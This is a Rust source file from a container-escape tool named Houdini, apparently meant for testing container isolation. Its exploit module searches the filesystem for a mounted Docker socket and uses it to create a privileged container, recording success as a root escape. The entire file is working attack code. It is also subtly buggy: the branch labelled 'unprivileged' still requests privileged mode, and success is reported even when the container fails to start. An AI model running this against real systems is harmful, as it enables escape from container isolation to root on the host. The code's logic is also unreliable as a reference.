// SPDX-License-Identifier: Apache-2.0
//
// Houdini  A container escape artist
// Copyright (c) 2022  William Findlay
//
// February 25, 2022  William Findlay  Created this.
//

use futures::StreamExt;
use std::{os::unix::prelude::FileTypeExt, path::PathBuf};
use uuid::Uuid;

use docker_api::{
    api::{ContainerCreateOpts, PullOpts},
    Docker,
};
use jwalk::{DirEntry, WalkDir};

use super::{Exploit, ExploitStatus};

const IMAGE: &'static str = "bash";

/// An exploit that targets a mounted docker docket inside a container.
#[derive(Debug, Default)]
pub struct MountedDockerSocket {
    status: Option<ExploitStatus>,
    container_name: Option<String>,
}

#[async_trait]
impl Exploit for MountedDockerSocket {
    async fn run(&mut self) {
        if let Some(socket) = find_docker_socket().await {
            let client = Docker::unix(&socket);
            self.container_name = Some(format!("houdini-pwned-{}", Uuid::new_v4()));

            // Check whether the payload image needs to be pulled
            if let Err(_) = client.images().get(IMAGE).inspect().await {
                // Pull the image if needed
                tracing::info!(
                    image = IMAGE,
                    "Failed to find payload image locally, pulling..."
                );
                let mut stream = client
                    .images()
                    .pull(&PullOpts::builder().image(IMAGE).build());
                while let Some(res) = stream.next().await {
                    if let Err(e) = res {
                        self.status = Some(ExploitStatus::Failure {
                            reason: format!("Failed to pull image: {e}"),
                        });
                        return;
                    }
                }
            } else {
                tracing::debug!(image = IMAGE, "Found payload image locally");
            }

            // Attempt to spawn a privileged container
            let opts = ContainerCreateOpts::builder(IMAGE)
                .name("houdini-pwned")
                .privileged(true)
                .build();
            if let Ok(container) = client.containers().create(&opts).await {
                if let Err(e) = container.start().await {
                    self.status = Some(ExploitStatus::Failure {
                        reason: format!("Failed to start container: {e}"),
                    })
                }
                self.status = Some(ExploitStatus::ContainerEscapeWithRoot);
                let _ = container.delete().await;
                return;
            }

            // Attempt to spawn an unprivileged container
            let opts = ContainerCreateOpts::builder(IMAGE)
                .name("houdini-pwned")
                .privileged(true)
                .build();
            match client.containers().create(&opts).await {
                Ok(container) => {
                    self.status = Some(ExploitStatus::ContainerEscape);
                    if let Err(e) = container.start().await {
                        self.status = Some(ExploitStatus::Failure {
                            reason: format!("Failed to start container: {e}"),
                        })
                    }
                    let _ = container.delete().await;
                    return;
                }
                Err(e) => {
                    self.status = Some(ExploitStatus::Failure {
                        reason: format!("Failed to create container: {e}"),
                    });
                }
            }
        } else {
            self.status = Some(ExploitStatus::Failure {
                reason: format!("Failed to find a mounted docker socket"),
            });
        }
    }

    async fn verify(&self) -> ExploitStatus {
        if let Some(status) = &self.status {
            return status.clone();
        }
        ExploitStatus::Failure {
            reason: "Unknown".into(),
        }
    }
}

/// Attempts to find a mounted Docker socket in the container's filesystem.
async fn find_docker_socket() -> Option<PathBuf> {
    for entry in WalkDir::new("/").into_iter().filter_map(Result::ok) {
        if test_docker_sock(&entry).await {
            tracing::info!(path = debug(&entry.path()), "Found mounted docker socket!");
            return Some(entry.path());
        }
    }
    tracing::info!("Failed to find mounted docker.sock");
    return None;
}

/// Tests a file to see if it is a Docker socket.
async fn test_docker_sock(entry: &DirEntry<((), ())>) -> bool {
    tracing::debug!(
        file = debug(&entry.path()),
        "Testing file for docker socket..."
    );
    if entry
        .metadata()
        .map(|m| m.file_type().is_socket())
        .unwrap_or(false)
    {
        tracing::debug!(file = debug(&entry.path()), "Found candidate socket!");
        let client = Docker::unix(&entry.path());
        if let Ok(_) = client.ping().await {
            return true;
        }
    }

    false
}
